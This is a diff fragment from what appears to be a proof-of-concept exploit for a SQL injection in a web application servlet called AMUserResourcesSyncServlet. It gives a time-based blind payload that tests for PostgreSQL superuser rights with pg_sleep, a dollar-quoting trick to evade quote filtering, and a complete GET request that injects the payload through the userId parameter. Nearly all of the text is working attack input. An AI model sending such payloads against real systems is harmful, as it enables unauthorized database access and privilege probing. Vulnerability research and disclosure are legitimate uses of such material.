@@ -17,7 +17,7 @@ Host: 192.168.170.113:8443
 
 Simple Query from psql admin tool: select case when current_setting('is_superuser')='on' then pg_sleep(10) end;
 
-Bypass Query: select case when current_setting($$is_superuser$$)='on' then pg_sleep(10) end;
+Bypass Query: SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;
 
 
 GET /servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+
